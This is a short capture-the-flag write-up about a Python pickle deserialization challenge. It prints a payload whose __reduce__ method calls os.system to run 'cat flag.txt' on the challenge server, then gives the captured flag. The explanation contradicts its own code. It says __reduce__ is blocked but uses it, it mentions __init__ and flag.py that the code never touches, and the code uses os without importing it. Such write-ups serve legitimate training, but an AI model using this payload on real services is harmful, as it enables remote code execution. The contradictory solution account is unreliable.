# pickle games 1

## Description:

> Tags: medium

> I bet the first one was pretty easy after understanding what pickle is.
But now that I REDUCEd the inputs allowed, can you still reach the FLAG variable?

> Author : chenx3n

> ncat -v --ssl pickle-games-2.challs.shellmates.club 443

> Files : [challenge.py](challenge.py)

## First thoughts:

The challenge is a follow-up, so it should be a harder than the first one.

## Reading the script:

Reading the script, we found that the input is passed to a `check` function, and it's checking if we have used the `__reduce__` method and if the payload length is less than 400 bytes.

## Solving the challenge:

What I did is I used the existing `FLAG` that's already imported, and using the `__init__` method, I read the file `flag.py`, in other words: I used the `FLAG` to read the flag.

![meme](meme.jpg)

```py
import pickle

class GetFlag():
    def __reduce__(self):
        command = ('cat flag.txt')
        return os.system, (command,)

pickled = pickle.dumps(GetFlag())
print(pickled.hex())
```

and the flag is:

```
shellmates{No_RedUC1Ng_N3ED3d}
```
